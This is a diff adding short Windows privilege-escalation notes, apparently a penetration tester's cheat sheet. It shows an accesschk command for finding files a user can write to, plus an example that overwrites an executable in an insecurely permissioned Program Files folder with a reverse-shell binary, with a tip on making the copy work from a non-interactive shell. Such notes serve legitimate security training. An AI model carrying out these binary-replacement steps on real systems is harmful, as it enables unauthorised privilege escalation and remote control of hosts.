@@ -1,0 +1,9 @@
+1. To check the File Permissions (Takes absolute PATH):
+
+-- .\accesschk.exe /accepteula -uqvw <Username> "C:\File\Path\To\Check\Permission.exe" (Note Extension like .exe can be anything) [This checks whether the user has any permission on specified file]
+
+[Very Important]: While copying the file using "copy" command always remember to use /Y. Because what happens sometimes the System will ask for confirmation like "Yes" or "No" in RDP based access. But in Reverse Shell or Non-Interactive based shell there will be an error "Access is denied." So to confirm /Y argument is necessary to specify. It will accept the pop-up if we are on cmd. Always using /Y won't hurt you rather than not using it.
+
+EG: copy "C:\Windows\Tasks\Reverse-Shell.exe" "C:\Program Files\Insecure File Permission\file.exe" /Y
+
+ 
